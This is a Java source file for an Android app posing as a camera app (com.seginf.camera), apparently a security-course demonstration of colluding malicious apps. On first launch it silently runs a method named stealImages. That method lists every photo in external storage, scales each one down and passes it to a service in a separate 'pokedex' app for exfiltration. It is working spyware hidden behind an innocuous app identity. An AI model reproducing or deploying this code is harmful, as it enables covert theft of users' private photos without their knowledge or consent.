package com.seginf.camera;

import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Parcelable;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;

public class MainApplication extends Application {

    private String IMAGES_STOLEN = "IMAGES STOLEN";
    private static String POKEDEX_PACKAGE = "com.seginf.pokedex";
    private static String TAG = "CAMERA main app";

    @Override
    public void onCreate() {
        super.onCreate();
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
        boolean didStealImages = sharedPreferences.getBoolean(IMAGES_STOLEN, false);
        if (!didStealImages) {
            sharedPreferences.edit().putBoolean(IMAGES_STOLEN, true).apply();
            stealImages();
        }
    }

    private void stealImages() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                ArrayList<String> imagesList = new ArrayList<>();
                String absolutePathOfImage;
                Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                String[] projection = {MediaStore.MediaColumns.DATA};
                Cursor cursor = getContentResolver().query(uri, projection, null, null, null);

                int column_index = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
                while (cursor.moveToNext()) {
                    absolutePathOfImage = cursor.getString(column_index);
                    imagesList.add(absolutePathOfImage);
                    Log.d("IMAGE", absolutePathOfImage);
                }
                Log.d("IMAGE COUNT", Integer.toString(imagesList.size()));

                for (String s : imagesList) {

                    File image = new File(s);
                    BitmapFactory.Options bmOptions = new BitmapFactory.Options();
                    Bitmap bitmap = BitmapFactory.decodeFile(image.getAbsolutePath(), bmOptions);

                    if (isPokemonAppInstalled()) {
                        Log.d(TAG, "Pokemon app is installed, sending bitmap");
                        sendBitmap(bitmap);
                    } else {
                        Log.d(TAG, "Pokemon app isn't installed =(");
                    }

                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

    public void sendBitmap(Parcelable bitmap) {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(POKEDEX_PACKAGE, "com.seginf.pokedex.PokemonService"));
        intent.putExtra("photo", scaleDownBitmap((Bitmap) bitmap, 100, this));
        startService(intent);
    }

    private boolean isPokemonAppInstalled() {
        try {
            getPackageManager().getPackageInfo(POKEDEX_PACKAGE, PackageManager.GET_SERVICES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public static Bitmap scaleDownBitmap(Bitmap photo, int newHeight, Context context) {

        final float densityMultiplier = context.getResources().getDisplayMetrics().density;

        int h = (int) (newHeight * densityMultiplier);
        int w = (int) (h * photo.getWidth() / ((double) photo.getHeight()));

        photo = Bitmap.createScaledBitmap(photo, w, h, true);

        return photo;
    }
}
